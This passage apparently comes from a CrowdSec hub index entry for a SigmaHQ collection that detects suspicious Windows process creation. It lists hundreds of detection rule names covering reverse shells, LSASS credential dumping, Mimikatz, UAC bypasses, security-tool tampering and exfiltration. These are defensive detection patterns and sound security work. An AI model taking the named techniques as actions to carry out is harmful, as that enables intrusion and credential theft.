sigmahq/proc_creation_win_reg_add_safeboot\n - sigmahq/proc_creation_win_reg_bitlocker\n - sigmahq/proc_creation_win_reg_delete_safeboot\n - sigmahq/proc_creation_win_reg_delete_services\n - sigmahq/proc_creation_win_reg_disable_sec_services\n - sigmahq/proc_creation_win_reg_dumping_sensitive_hives\n - sigmahq/proc_creation_win_regedit_export_critical_keys\n - sigmahq/proc_creation_win_regedit_import_keys_ads\n - sigmahq/proc_creation_win_regedit_trustedinstaller\n - sigmahq/proc_creation_win_regini_ads\n - sigmahq/proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade\n - sigmahq/proc_creation_win_registry_install_reg_debugger_backdoor\n - sigmahq/proc_creation_win_registry_logon_script\n - sigmahq/proc_creation_win_registry_new_network_provider\n - sigmahq/proc_creation_win_registry_office_disable_python_security_warnings\n - sigmahq/proc_creation_win_registry_privilege_escalation_via_service_key\n - sigmahq/proc_creation_win_registry_provlaunch_provisioning_command\n - sigmahq/proc_creation_win_registry_set_unsecure_powershell_policy\n - sigmahq/proc_creation_win_reg_lsa_disable_restricted_admin\n - sigmahq/proc_creation_win_reg_lsa_ppl_protection_disabled\n - sigmahq/proc_creation_win_reg_nolmhash\n - sigmahq/proc_creation_win_reg_rdp_keys_tamper\n - sigmahq/proc_creation_win_reg_susp_paths\n - sigmahq/proc_creation_win_regsvr32_http_ip_pattern\n - sigmahq/proc_creation_win_regsvr32_remote_share\n - sigmahq/proc_creation_win_regsvr32_susp_child_process\n - sigmahq/proc_creation_win_regsvr32_susp_exec_path_2\n - sigmahq/proc_creation_win_regsvr32_susp_extensions\n - sigmahq/proc_creation_win_reg_volsnap_disable\n - sigmahq/proc_creation_win_reg_windows_defender_tamper\n - sigmahq/proc_creation_win_remote_access_tools_anydesk_silent_install\n - sigmahq/proc_creation_win_remote_access_tools_anydesk_susp_exec\n - sigmahq/proc_creation_win_renamed_adfind\n - sigmahq/proc_creation_win_renamed_autoit\n - sigmahq/proc_creation_win_renamed_binary_highly_relevant\n - sigmahq/proc_creation_win_renamed_browsercore\n - sigmahq/proc_creation_win_renamed_cloudflared\n - sigmahq/proc_creation_win_renamed_createdump\n - sigmahq/proc_creation_win_renamed_dctask64\n - sigmahq/proc_creation_win_renamed_gpg4win\n - sigmahq/proc_creation_win_renamed_jusched\n - sigmahq/proc_creation_win_renamed_mavinject\n - sigmahq/proc_creation_win_renamed_megasync\n - sigmahq/proc_creation_win_renamed_msdt\n - sigmahq/proc_creation_win_renamed_netsupport_rat\n - sigmahq/proc_creation_win_renamed_office_processes\n - sigmahq/proc_creation_win_renamed_paexec\n - sigmahq/proc_creation_win_renamed_plink\n - sigmahq/proc_creation_win_renamed_rundll32_dllregisterserver\n - sigmahq/proc_creation_win_renamed_sysinternals_debugview\n - sigmahq/proc_creation_win_renamed_sysinternals_procdump\n - sigmahq/proc_creation_win_renamed_sysinternals_psexec_service\n - sigmahq/proc_creation_win_renamed_sysinternals_sdelete\n - sigmahq/proc_creation_win_renamed_vmnat\n - sigmahq/proc_creation_win_renamed_whoami\n - sigmahq/proc_creation_win_rundll32_ads_stored_dll_execution\n - sigmahq/proc_creation_win_rundll32_advpack_obfuscated_ordinal_call\n - sigmahq/proc_creation_win_rundll32_inline_vbs\n - sigmahq/proc_creation_win_rundll32_keymgr\n - sigmahq/proc_creation_win_rundll32_mshtml_runhtmlapplication\n - sigmahq/proc_creation_win_rundll32_no_params\n - sigmahq/proc_creation_win_rundll32_ntlmrelay\n - sigmahq/proc_creation_win_rundll32_process_dump_via_comsvcs\n - sigmahq/proc_creation_win_rundll32_registered_com_objects\n - sigmahq/proc_creation_win_rundll32_shell32_susp_execution\n - sigmahq/proc_creation_win_rundll32_spawn_explorer\n - sigmahq/proc_creation_win_rundll32_susp_control_dll_load\n - sigmahq/proc_creation_win_rundll32_susp_execution_with_image_extension\n - sigmahq/proc_creation_win_rundll32_susp_shellexec_execution\n - sigmahq/proc_creation_win_rundll32_susp_shimcache_flush\n - sigmahq/proc_creation_win_rundll32_sys\n - sigmahq/proc_creation_win_rundll32_unc_path\n - sigmahq/proc_creation_win_rundll32_webdav_client_susp_execution\n - sigmahq/proc_creation_win_rundll32_without_parameters\n - sigmahq/proc_creation_win_sc_change_sevice_image_path_by_non_admin\n - sigmahq/proc_creation_win_schtasks_appdata_local_system\n - sigmahq/proc_creation_win_schtasks_change\n - sigmahq/proc_creation_win_schtasks_creation_temp_folder\n - sigmahq/proc_creation_win_schtasks_delete_all\n - sigmahq/proc_creation_win_schtasks_delete\n - sigmahq/proc_creation_win_schtasks_disable\n - sigmahq/proc_creation_win_schtasks_folder_combos\n - sigmahq/proc_creation_win_schtasks_one_time_only_midnight_task\n - sigmahq/proc_creation_win_schtasks_powershell_persistence\n - sigmahq/proc_creation_win_schtasks_reg_loader_encoded\n - sigmahq/proc_creation_win_schtasks_schedule_type\n - sigmahq/proc_creation_win_schtasks_system\n - sigmahq/proc_creation_win_scrcons_susp_child_process\n - sigmahq/proc_creation_win_sc_sdset_allow_service_changes\n - sigmahq/proc_creation_win_sc_sdset_deny_service_access\n - sigmahq/proc_creation_win_sc_sdset_hide_sevices\n - sigmahq/proc_creation_win_sc_service_path_modification\n - sigmahq/proc_creation_win_sdiagnhost_susp_child\n - sigmahq/proc_creation_win_servu_susp_child_process\n - sigmahq/proc_creation_win_setres_uncommon_child_process\n - sigmahq/proc_creation_win_splwow64_cli_anomaly\n - sigmahq/proc_creation_win_spoolsv_susp_child_processes\n - sigmahq/proc_creation_win_sqlcmd_veeam_dump\n - sigmahq/proc_creation_win_sqlite_chromium_profile_data\n - sigmahq/proc_creation_win_sqlite_firefox_gecko_profile_data\n - sigmahq/proc_creation_win_ssh_rdp_tunneling\n - sigmahq/proc_creation_win_stordiag_susp_child_process\n - sigmahq/proc_creation_win_susp_abusing_debug_privilege\n - sigmahq/proc_creation_win_susp_add_user_privileged_group\n - sigmahq/proc_creation_win_susp_add_user_remote_desktop_group\n - sigmahq/proc_creation_win_susp_archiver_iso_phishing\n - sigmahq/proc_creation_win_susp_child_process_as_system_\n - sigmahq/proc_creation_win_susp_cli_obfuscation_unicode_img\n - sigmahq/proc_creation_win_susp_copy_system_dir_lolbin\n - sigmahq/proc_creation_win_susp_crypto_mining_monero\n - sigmahq/proc_creation_win_susp_data_exfiltration_via_cli\n - sigmahq/proc_creation_win_susp_disable_raccine\n - sigmahq/proc_creation_win_susp_double_extension_parent\n - sigmahq/proc_creation_win_susp_double_extension\n - sigmahq/proc_creation_win_susp_download_office_domain\n - sigmahq/proc_creation_win_susp_dumpstack_log_evasion\n - sigmahq/proc_creation_win_susp_emoji_usage_in_cli_1\n - sigmahq/proc_creation_win_susp_emoji_usage_in_cli_2\n - sigmahq/proc_creation_win_susp_emoji_usage_in_cli_3\n - sigmahq/proc_creation_win_susp_emoji_usage_in_cli_4\n - sigmahq/proc_creation_win_susp_etw_modification_cmdline\n - sigmahq/proc_creation_win_susp_etw_trace_evasion\n - sigmahq/proc_creation_win_susp_eventlog_clear\n - sigmahq/proc_creation_win_susp_execution_from_public_folder_as_parent\n - sigmahq/proc_creation_win_susp_execution_path\n - sigmahq/proc_creation_win_susp_gather_network_info_execution\n - sigmahq/proc_creation_win_susp_image_missing\n - sigmahq/proc_creation_win_susp_inline_base64_mz_header\n - sigmahq/proc_creation_win_susp_inline_win_api_access\n - sigmahq/proc_creation_win_susp_lsass_dmp_cli_keywords\n - sigmahq/proc_creation_win_susp_non_priv_reg_or_ps\n - sigmahq/proc_creation_win_susp_ntds\n - sigmahq/proc_creation_win_susp_nteventlogfile_usage\n - sigmahq/proc_creation_win_susp_parents\n - sigmahq/proc_creation_win_susp_powershell_execution_via_dll\n - sigmahq/proc_creation_win_susp_priv_escalation_via_named_pipe\n - sigmahq/proc_creation_win_susp_progname\n - sigmahq/proc_creation_win_susp_recycle_bin_fake_execution\n - sigmahq/proc_creation_win_susp_redirect_local_admin_share\n - sigmahq/proc_creation_win_susp_right_to_left_override\n - sigmahq/proc_creation_win_susp_script_exec_from_env_folder\n - sigmahq/proc_creation_win_susp_script_exec_from_temp\n - sigmahq/proc_creation_win_susp_sensitive_file_access_shadowcopy\n - sigmahq/proc_creation_win_susp_service_creation\n - sigmahq/proc_creation_win_susp_service_dir\n - sigmahq/proc_creation_win_susp_service_tamper\n - sigmahq/proc_creation_win_susp_shadow_copies_deletion\n - sigmahq/proc_creation_win_susp_shell_spawn_susp_program\n - sigmahq/proc_creation_win_susp_system_user_anomaly\n - sigmahq/proc_creation_win_susp_task_folder_evasion\n - sigmahq/proc_creation_win_susp_whoami_as_param\n - sigmahq/proc_creation_win_susp_workfolders\n - sigmahq/proc_creation_win_svchost_execution_with_no_cli_flags\n - sigmahq/proc_creation_win_svchost_termserv_proc_spawn\n - sigmahq/proc_creation_win_sysinternals_adexplorer_susp_execution\n - sigmahq/proc_creation_win_sysinternals_procdump_evasion\n - sigmahq/proc_creation_win_sysinternals_procdump_lsass\n - sigmahq/proc_creation_win_sysinternals_psexec_paexec_escalate_system\n - sigmahq/proc_creation_win_sysinternals_psexec_remote_execution\n - sigmahq/proc_creation_win_sysinternals_psexesvc_as_system\n - sigmahq/proc_creation_win_sysinternals_pssuspend_susp_execution\n - sigmahq/proc_creation_win_sysinternals_sdelete\n - sigmahq/proc_creation_win_sysinternals_susp_psexec_paexec_flags\n - sigmahq/proc_creation_win_sysinternals_sysmon_uninstall\n - sigmahq/proc_creation_win_systemsettingsadminflows_turn_on_dev_features\n - sigmahq/proc_creation_win_taskkill_sep\n - sigmahq/proc_creation_win_taskmgr_localsystem\n - sigmahq/proc_creation_win_tscon_localsystem\n - sigmahq/proc_creation_win_tscon_rdp_redirect\n - sigmahq/proc_creation_win_uac_bypass_changepk_slui\n - sigmahq/proc_creation_win_uac_bypass_cleanmgr\n - sigmahq/proc_creation_win_uac_bypass_cmstp_com_object_access\n - sigmahq/proc_creation_win_uac_bypass_cmstp\n - sigmahq/proc_creation_win_uac_bypass_computerdefaults\n - sigmahq/proc_creation_win_uac_bypass_consent_comctl32\n - sigmahq/proc_creation_win_uac_bypass_dismhost\n - sigmahq/proc_creation_win_uac_bypass_eventvwr_recentviews\n - sigmahq/proc_creation_win_uac_bypass_fodhelper\n - sigmahq/proc_creation_win_uac_bypass_icmluautil\n - sigmahq/proc_creation_win_uac_bypass_idiagnostic_profile\n - sigmahq/proc_creation_win_uac_bypass_ieinstal\n - sigmahq/proc_creation_win_uac_bypass_msconfig_gui\n - sigmahq/proc_creation_win_uac_bypass_ntfs_reparse_point\n - sigmahq/proc_creation_win_uac_bypass_pkgmgr_dism\n - sigmahq/proc_creation_win_uac_bypass_trustedpath\n - sigmahq/proc_creation_win_uac_bypass_winsat\n - sigmahq/proc_creation_win_uac_bypass_wmp\n - sigmahq/proc_creation_win_uac_bypass_wsreset_integrity_level\n - sigmahq/proc_creation_win_uac_bypass_wsreset\n - sigmahq/proc_creation_win_ultravnc_susp_execution\n - sigmahq/proc_creation_win_uninstall_crowdstrike_falcon\n - sigmahq/proc_creation_win_userinit_uncommon_child_processes\n - sigmahq/proc_creation_win_vmware_toolbox_cmd_persistence_susp\n - sigmahq/proc_creation_win_vmware_vmtoolsd_susp_child_process\n - sigmahq/proc_creation_win_vscode_tunnel_renamed_execution\n - sigmahq/proc_creation_win_w32tm\n - sigmahq/proc_creation_win_wab_execution_from_non_default_location\n - sigmahq/proc_creation_win_wab_unusual_parents\n - sigmahq/proc_creation_win_wbadmin_delete_all_backups\n - sigmahq/proc_creation_win_webshell_chopper\n - sigmahq/proc_creation_win_webshell_hacking\n - sigmahq/proc_creation_win_webshell_recon_commands_and_processes\n - sigmahq/proc_creation_win_webshell_susp_process_spawned_from_webserver\n - sigmahq/proc_creation_win_webshell_tool_recon\n - sigmahq/proc_creation_win_werfault_lsass_shtinkering\n - sigmahq/proc_creation_win_wermgr_susp_exec_location\n - sigmahq/proc_creation_win_wget_download_direct_ip\n - sigmahq/proc_creation_win_whoami_execution_from_high_priv_process\n - sigmahq/proc_creation_win_whoami_priv_discovery\n - sigmahq/proc_creation_win_winget_add_insecure_custom_source\n - sigmahq/proc_creation_win_winrm_susp_child_process\n - sigmahq/proc_creation_win_wmi_backdoor_exchange_transport_agent\n - sigmahq/proc_creation_win_wmic_eventconsumer_creation\n - sigmahq/proc_creation_win_wmic_namespace_defender\n - sigmahq/proc_creation_win_wmic_susp_execution_via_office_process\n - sigmahq/proc_creation_win_wmic_susp_process_creation\n - sigmahq/proc_creation_win_wmic_uninstall_security_products\n - sigmahq/proc_creation_win_wmiprvse_susp_child_processes\n - sigmahq/proc_creation_win_wpbbin_potential_persistence\n - sigmahq/proc_creation_win_wscript_cscript_uncommon_extension_exec\n - sigmahq/proc_creation_win_wuauclt_dll_loading\n - sigmahq/proc_creation_win_wuauclt_no_cli_flags_execution\n - sigmahq/proc_creation_win_wusa_cab_files_extraction_from_susp_paths\n - sigmahq/proc_creation_win_xwizard_execution_non_default_location\ndescription: \"Windows : Suspcious Process Creation (by SigmaHQ)\"\nauthor: sigmahq\ntags:\n - windows\n - post-exploitation\n - sysmon\n", "contexts": ["crowdsecurity/sysmon_base"], "description": "Windows : Suspcious Process Creation (by SigmaHQ)", "parsers": ["crowdsecurity/sysmon-logs"], "path": "collections/sigmahq/windows_proc_creation.yaml", "scenarios": ["sigmahq/proc_creation_win_addinutil_suspicious_cmdline", "sigmahq/proc_creation_win_adplus_memory_dump", "sigmahq/proc_creation_win_agentexecutor_susp_usage", "sigmahq/proc_creation_win_aspnet_compiler_susp_child_process", "sigmahq/proc_creation_win_aspnet_compiler_susp_paths", "sigmahq/proc_creation_win_at_interactive_execution", "sigmahq/proc_creation_win_attrib_system_susp_paths", "sigmahq/proc_creation_win_auditpol_nt_resource_kit_usage", "sigmahq/proc_creation_win_auditpol_susp_execution", "sigmahq/proc_creation_win_bcdedit_boot_conf_tamper", "sigmahq/proc_creation_win_bginfo_suspicious_child_process", "sigmahq/proc_creation_win_bitsadmin_download_direct_ip", "sigmahq/proc_creation_win_bitsadmin_download_susp_extensions", "sigmahq/proc_creation_win_bitsadmin_download_susp_targetfolder", "sigmahq/proc_creation_win_browsers_chromium_headless_debugging", "sigmahq/proc_creation_win_browsers_chromium_headless_file_download", "sigmahq/proc_creation_win_browsers_chromium_mockbin_abuse", "sigmahq/proc_creation_win_browsers_chromium_susp_load_extension", "sigmahq/proc_creation_win_browsers_tor_execution", "sigmahq/proc_creation_win_calc_uncommon_exec", "sigmahq/proc_creation_win_certoc_download_direct_ip", "sigmahq/proc_creation_win_certoc_load_dll_susp_locations", "sigmahq/proc_creation_win_certutil_download_direct_ip", "sigmahq/proc_creation_win_certutil_ntlm_coercion", "sigmahq/proc_creation_win_citrix_trolleyexpress_procdump", "sigmahq/proc_creation_win_cmd_assoc_tamper_exe_file_association", "sigmahq/proc_creation_win_cmd_copy_dmp_from_share", "sigmahq/proc_creation_win_cmd_curl_download_exec_combo", "sigmahq/proc_creation_win_cmdkey_recon", "sigmahq/proc_creation_win_cmd_mklink_osk_cmd", "sigmahq/proc_creation_win_cmd_mklink_shadow_copies_access_symlink", "sigmahq/proc_creation_win_cmd_net_use_and_exec_combo", "sigmahq/proc_creation_win_cmd_no_space_execution", "sigmahq/proc_creation_win_cmd_ntdllpipe_redirect", "sigmahq/proc_creation_win_cmd_path_traversal", "sigmahq/proc_creation_win_cmd_ping_del_combined_execution", "sigmahq/proc_creation_win_cmd_shadowcopy_access", "sigmahq/proc_creation_win_cmd_sticky_key_like_backdoor_execution", "sigmahq/proc_creation_win_cmd_sticky_keys_replace", "sigmahq/proc_creation_win_cmstp_execution_by_creation", "sigmahq/proc_creation_win_conhost_path_traversal", "sigmahq/proc_creation_win_control_panel_item", "sigmahq/proc_creation_win_createdump_lolbin_execution", "sigmahq/proc_creation_win_csc_susp_parent", "sigmahq/proc_creation_win_csi_use_of_csharp_console", "sigmahq/proc_creation_win_curl_download_direct_ip_susp_extensions", "sigmahq/proc_creation_win_curl_susp_download", "sigmahq/proc_creation_win_dctask64_arbitrary_command_and_dll_execution", "sigmahq/proc_creation_win_desktopimgdownldr_susp_execution", "sigmahq/proc_creation_win_dism_enable_powershell_web_access_feature", "sigmahq/proc_creation_win_dllhost_no_cli_execution", "sigmahq/proc_creation_win_dll_sideload_vmware_xfer", "sigmahq/proc_creation_win_dnscmd_install_new_server_level_plugin_dll", "sigmahq/proc_creation_win_dns_exfiltration_tools_execution", "sigmahq/proc_creation_win_dns_susp_child_process", "sigmahq/proc_creation_win_driverquery_recon", "sigmahq/proc_creation_win_dtrace_kernel_dump", "sigmahq/proc_creation_win_dump64_defender_av_bypass_rename", "sigmahq/proc_creation_win_dumpminitool_susp_execution", "sigmahq/proc_creation_win_esentutl_sensitive_file_copy", "sigmahq/proc_creation_win_eventvwr_susp_child_process", "sigmahq/proc_creation_win_explorer_nouaccheck", "sigmahq/proc_creation_win_findstr_gpp_passwords", "sigmahq/proc_creation_win_findstr_sysmon_discovery_via_default_altitude", "sigmahq/proc_creation_win_finger_execution", "sigmahq/proc_creation_win_fltmc_unload_driver_sysmon", "sigmahq/proc_creation_win_forfiles_child_process_masquerading", "sigmahq/proc_creation_win_format_uncommon_filesystem_load", "sigmahq/proc_creation_win_fsutil_usage", "sigmahq/proc_creation_win_googleupdate_susp_child_process", "sigmahq/proc_creation_win_gpg4win_susp_location", "sigmahq/proc_creation_win_gup_download", "sigmahq/proc_creation_win_gup_suspicious_execution", "sigmahq/proc_creation_win_hh_html_help_susp_child_process", "sigmahq/proc_creation_win_hh_susp_execution", "sigmahq/proc_creation_win_hktl_adcspwn", "sigmahq/proc_creation_win_hktl_bloodhound_sharphound", "sigmahq/proc_creation_win_hktl_c3_rundll32_pattern", "sigmahq/proc_creation_win_hktl_certify", "sigmahq/proc_creation_win_hktl_certipy", "sigmahq/proc_creation_win_hktl_cobaltstrike_bloopers_cmd", "sigmahq/proc_creation_win_hktl_cobaltstrike_bloopers_modules", "sigmahq/proc_creation_win_hktl_cobaltstrike_load_by_rundll32", "sigmahq/proc_creation_win_hktl_cobaltstrike_process_patterns", "sigmahq/proc_creation_win_hktl_covenant", "sigmahq/proc_creation_win_hktl_crackmapexec_execution_patterns", "sigmahq/proc_creation_win_hktl_crackmapexec_execution", "sigmahq/proc_creation_win_hktl_crackmapexec_patterns", "sigmahq/proc_creation_win_hktl_crackmapexec_powershell_obfuscation", "sigmahq/proc_creation_win_hktl_createminidump", "sigmahq/proc_creation_win_hktl_dinjector", "sigmahq/proc_creation_win_hktl_dumpert", "sigmahq/proc_creation_win_hktl_edrsilencer", "sigmahq/proc_creation_win_hktl_empire_powershell_launch", "sigmahq/proc_creation_win_hktl_empire_powershell_uac_bypass", "sigmahq/proc_creation_win_hktl_execution_via_imphashes", "sigmahq/proc_creation_win_hktl_execution_via_pe_metadata", "sigmahq/proc_creation_win_hktl_gmer", "sigmahq/proc_creation_win_hktl_handlekatz", "sigmahq/proc_creation_win_hktl_hashcat", "sigmahq/proc_creation_win_hktl_htran_or_natbypass", "sigmahq/proc_creation_win_hktl_hydra", "sigmahq/proc_creation_win_hktl_impacket_lateral_movement", "sigmahq/proc_creation_win_hktl_impacket_tools", "sigmahq/proc_creation_win_hktl_inveigh", "sigmahq/proc_creation_win_hktl_invoke_obfuscation_clip", "sigmahq/proc_creation_win_hktl_invoke_obfuscation_obfuscated_iex_commandline", "sigmahq/proc_creation_win_hktl_invoke_obfuscation_stdin", "sigmahq/proc_creation_win_hktl_invoke_obfuscation_var", "sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_stdin", "sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_use_clip", "sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_use_mhsta", "sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_var", "sigmahq/proc_creation_win_hktl_koadic", "sigmahq/proc_creation_win_hktl_krbrelayup", "sigmahq/proc_creation_win_hktl_krbrelay", "sigmahq/proc_creation_win_hktl_localpotato", "sigmahq/proc_creation_win_hktl_meterpreter_getsystem", "sigmahq/proc_creation_win_hktl_mimikatz_command_line", "sigmahq/proc_creation_win_hktl_pchunter", "sigmahq/proc_creation_win_hktl_powersploit_empire_default_schtasks", "sigmahq/proc_creation_win_hktl_powertool", "sigmahq/proc_creation_win_hktl_purplesharp_indicators", "sigmahq/proc_creation_win_hktl_pypykatz", "sigmahq/proc_creation_win_hktl_quarks_pwdump", "sigmahq/proc_creation_win_hktl_redmimicry_winnti_playbook", "sigmahq/proc_creation_win_hktl_relay_attacks_tools", "sigmahq/proc_creation_win_hktl_rubeus", "sigmahq/proc_creation_win_hktl_safetykatz", "sigmahq/proc_creation_win_hktl_secutyxploded", "sigmahq/proc_creation_win_hktl_selectmyparent", "sigmahq/proc_creation_win_hktl_sharp_chisel", "sigmahq/proc_creation_win_hktl_sharpersist", "sigmahq/proc_creation_win_hktl_sharpevtmute", "sigmahq/proc_creation_win_hktl_sharp_impersonation", "sigmahq/proc_creation_win_hktl_sharpldapwhoami", "sigmahq/proc_creation_win_hktl_sharpup", "sigmahq/proc_creation_win_hktl_sharpview", "sigmahq/proc_creation_win_hktl_silenttrinity_stager", "sigmahq/proc_creation_win_hktl_sliver_c2_execution_pattern", "sigmahq/proc_creation_win_hktl_stracciatella_execution", "sigmahq/proc_creation_win_hktl_sysmoneop", "sigmahq/proc_creation_win_hktl_trufflesnout", "sigmahq/proc_creation_win_hktl_uacme", "sigmahq/proc_creation_win_hktl_wce", "sigmahq/proc_creation_win_hktl_winpeas", "sigmahq/proc_creation_win_hktl_winpwn", "sigmahq/proc_creation_win_hktl_wmiexec_default_powershell", "sigmahq/proc_creation_win_hktl_xordump", "sigmahq/proc_creation_win_hwp_exploits", "sigmahq/proc_creation_win_ieexec_download", "sigmahq/proc_creation_win_iis_appcmd_http_logging", "sigmahq/proc_creation_win_iis_appcmd_service_account_password_dumped", "sigmahq/proc_creation_win_iis_connection_strings_decryption", "sigmahq/proc_creation_win_iis_susp_module_registration", "sigmahq/proc_creation_win_imagingdevices_unusual_parents", "sigmahq/proc_creation_win_imewbdld_download", "sigmahq/proc_creation_win_java_keytool_susp_child_process", "sigmahq/proc_creation_win_java_manageengine_susp_child_process", "sigmahq/proc_creation_win_kavremover_uncommon_execution", "sigmahq/proc_creation_win_logman_disable_eventlog", "sigmahq/proc_creation_win_lolbin_devtoolslauncher", "sigmahq/proc_creation_win_lolbin_manage_bde", "sigmahq/proc_creation_win_lolbin_mavinject_process_injection", "sigmahq/proc_creation_win_lolbin_mpiexec", "sigmahq/proc_creation_win_lolbin_msdt_answer_file", "sigmahq/proc_creation_win_lolbin_openwith", "sigmahq/proc_creation_win_lolbin_pcwrun_follina", "sigmahq/proc_creation_win_lolbin_printbrm", "sigmahq/proc_creation_win_lolbin_settingsynchost", "sigmahq/proc_creation_win_lolbin_susp_certreq_download", "sigmahq/proc_creation_win_lolbin_susp_grpconv", "sigmahq/proc_creation_win_lolbin_tttracer_mod_load", "sigmahq/proc_creation_win_lolbin_visual_basic_compiler", "sigmahq/proc_creation_win_lsass_process_clone", "sigmahq/proc_creation_win_mmc_mmc20_lateral_movement", "sigmahq/proc_creation_win_mmc_susp_child_process", "sigmahq/proc_creation_win_mofcomp_execution", "sigmahq/proc_creation_win_mpcmdrun_dll_sideload_defender", "sigmahq/proc_creation_win_mpcmdrun_download_arbitrary_file", "sigmahq/proc_creation_win_mpcmdrun_remove_windows_defender_definition", "sigmahq/proc_creation_win_msdt_arbitrary_command_execution", "sigmahq/proc_creation_win_msdt_susp_parent", "sigmahq/proc_creation_win_mshta_http", "sigmahq/proc_creation_win_mshta_javascript", "sigmahq/proc_creation_win_mshta_lethalhta_technique", "sigmahq/proc_creation_win_mshta_susp_child_processes", "sigmahq/proc_creation_win_mshta_susp_execution", "sigmahq/proc_creation_win_mshta_susp_pattern", "sigmahq/proc_creation_win_msiexec_masquerading", "sigmahq/proc_creation_win_msra_process_injection", "sigmahq/proc_creation_win_mssql_susp_child_process", "sigmahq/proc_creation_win_mssql_veaam_susp_child_processes", "sigmahq/proc_creation_win_mstsc_rdp_hijack_shadowing", "sigmahq/proc_creation_win_mstsc_run_local_rdp_file_susp_location", "sigmahq/proc_creation_win_mstsc_run_local_rpd_file_susp_parent", "sigmahq/proc_creation_win_msxsl_remote_execution", "sigmahq/proc_creation_win_netsh_fw_allow_program_in_susp_location", "sigmahq/proc_creation_win_netsh_fw_allow_rdp", "sigmahq/proc_creation_win_netsh_port_forwarding_3389", "sigmahq/proc_creation_win_net_use_mount_internet_share", "sigmahq/proc_creation_win_net_user_add_never_expire", "sigmahq/proc_creation_win_net_user_default_accounts_manipulation", "sigmahq/proc_creation_win_node_abuse", "sigmahq/proc_creation_win_nslookup_domain_discovery", "sigmahq/proc_creation_win_odbcconf_driver_install_susp", "sigmahq/proc_creation_win_odbcconf_exec_susp_locations", "sigmahq/proc_creation_win_odbcconf_register_dll_regsvr_susp", "sigmahq/proc_creation_win_office_arbitrary_cli_download", "sigmahq/proc_creation_win_office_excel_dcom_lateral_movement", "sigmahq/proc_creation_win_office_exec_from_trusted_locations", "sigmahq/proc_creation_win_office_onenote_embedded_script_execution", "sigmahq/proc_creation_win_office_onenote_susp_child_processes", "sigmahq/proc_creation_win_office_outlook_enable_unsafe_client_mail_rules", "sigmahq/proc_creation_win_office_outlook_execution_from_temp", "sigmahq/proc_creation_win_office_outlook_susp_child_processes_remote", "sigmahq/proc_creation_win_office_outlook_susp_child_processes", "sigmahq/proc_creation_win_office_spawn_exe_from_users_directory", "sigmahq/proc_creation_win_office_susp_child_processes", "sigmahq/proc_creation_win_ping_hex_ip", "sigmahq/proc_creation_win_plink_port_forwarding", "sigmahq/proc_creation_win_plink_susp_tunneling", "sigmahq/proc_creation_win_powershell_aadinternals_cmdlets_execution", "sigmahq/proc_creation_win_powershell_amsi_init_failed_bypass", "sigmahq/proc_creation_win_powershell_base64_encoded_cmd_patterns", "sigmahq/proc_creation_win_powershell_base64_encoded_cmd", "sigmahq/proc_creation_win_powershell_base64_encoded_obfusc", "sigmahq/proc_creation_win_powershell_base64_frombase64string", "sigmahq/proc_creation_win_powershell_base64_hidden_flag", "sigmahq/proc_creation_win_powershell_base64_iex", "sigmahq/proc_creation_win_powershell_base64_invoke", "sigmahq/proc_creation_win_powershell_base64_mppreference", "sigmahq/proc_creation_win_powershell_base64_reflection_assembly_load_obfusc", "sigmahq/proc_creation_win_powershell_base64_reflection_assembly_load", "sigmahq/proc_creation_win_powershell_base64_wmi_classes", "sigmahq/proc_creation_win_powershell_cmdline_reversed_strings", "sigmahq/proc_creation_win_powershell_cmdline_special_characters", "sigmahq/proc_creation_win_powershell_decrypt_pattern", "sigmahq/proc_creation_win_powershell_defender_disable_feature", "sigmahq/proc_creation_win_powershell_disable_defender_av_security_monitoring", "sigmahq/proc_creation_win_powershell_disable_ie_features", "sigmahq/proc_creation_win_powershell_download_cradle_obfuscated", "sigmahq/proc_creation_win_powershell_download_iex", "sigmahq/proc_creation_win_powershell_email_exfil", "sigmahq/proc_creation_win_powershell_frombase64string", "sigmahq/proc_creation_win_powershell_getprocess_lsass", "sigmahq/proc_creation_win_powershell_hide_services_via_set_service", "sigmahq/proc_creation_win_powershell_iex_patterns", "sigmahq/proc_creation_win_powershell_import_cert_susp_locations", "sigmahq/proc_creation_win_powershell_mailboxexport_share", "sigmahq/proc_creation_win_powershell_obfuscation_via_utf8", "sigmahq/proc_creation_win_powershell_public_folder", "sigmahq/proc_creation_win_powershell_remotefxvgpudisablement_abuse", "sigmahq/proc_creation_win_powershell_remove_mppreference", "sigmahq/proc_creation_win_powershell_reverse_shell_connection", "sigmahq/proc_creation_win_powershell_run_script_from_ads", "sigmahq/proc_creation_win_powershell_run_script_from_input_stream", "sigmahq/proc_creation_win_powershell_sam_access", "sigmahq/proc_creation_win_powershell_service_dacl_modification_set_service", "sigmahq/proc_creation_win_powershell_set_acl_susp_location", "sigmahq/proc_creation_win_powershell_set_acl", "sigmahq/proc_creation_win_powershell_shadowcopy_deletion", "sigmahq/proc_creation_win_powershell_snapins_hafnium", "sigmahq/proc_creation_win_powershell_susp_download_patterns", "sigmahq/proc_creation_win_powershell_susp_parameter_variation", "sigmahq/proc_creation_win_powershell_susp_parent_process", "sigmahq/proc_creation_win_powershell_susp_ps_downloadfile", "sigmahq/proc_creation_win_powershell_token_obfuscation", "sigmahq/proc_creation_win_powershell_webclient_casing", "sigmahq/proc_creation_win_provlaunch_susp_child_process", "sigmahq/proc_creation_win_pua_3proxy_execution", "sigmahq/proc_creation_win_pua_adfind_enumeration", "sigmahq/proc_creation_win_pua_adfind_susp_usage", "sigmahq/proc_creation_win_pua_advancedrun_priv_user", "sigmahq/proc_creation_win_pua_chisel", "sigmahq/proc_creation_win_pua_cleanwipe", "sigmahq/proc_creation_win_pua_crassus", "sigmahq/proc_creation_win_pua_csexec", "sigmahq/proc_creation_win_pua_defendercheck", "sigmahq/proc_creation_win_pua_ditsnap", "sigmahq/proc_creation_win_pua_frp", "sigmahq/proc_creation_win_pua_iox", "sigmahq/proc_creation_win_pua_netcat", "sigmahq/proc_creation_win_pua_ngrok", "sigmahq/proc_creation_win_pua_nimgrab", "sigmahq/proc_creation_win_pua_nircmd_as_system", "sigmahq/proc_creation_win_pua_nps", "sigmahq/proc_creation_win_pua_nsudo", "sigmahq/proc_creation_win_pua_rclone_execution", "sigmahq/proc_creation_win_pua_runxcmd", "sigmahq/proc_creation_win_pua_seatbelt", "sigmahq/proc_creation_win_pua_wsudo_susp_execution", "sigmahq/proc_creation_win_python_pty_spawn", "sigmahq/proc_creation_win_rar_compression_with_password", 